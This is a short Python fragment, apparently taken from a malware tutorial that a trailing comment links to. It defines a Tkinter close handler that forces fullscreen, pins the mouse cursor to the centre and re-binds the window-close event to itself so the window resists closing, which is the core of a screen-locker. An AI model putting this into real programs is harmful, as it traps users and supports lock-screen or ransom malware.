def on_closing():
    # Click in the center of the screen
    click(width/2, height/2)
    # Move the cursor to the center of the screen
    moveTo(width/2, height/2)
    # Enable full-screen mode
    root.attributes("-fullscreen", True)
    # If the user attempts to close the window from the Task Manager, call on_closing
    root.protocol("WM_DELETE_WINDOW", on_closing)
    # Enable continuous updating of the window
    root.update()
    # Add a key combination that closes the program
    root.bind('<Control-KeyPress-c>', callback)


#https://hackmag.com/coding/python-malware/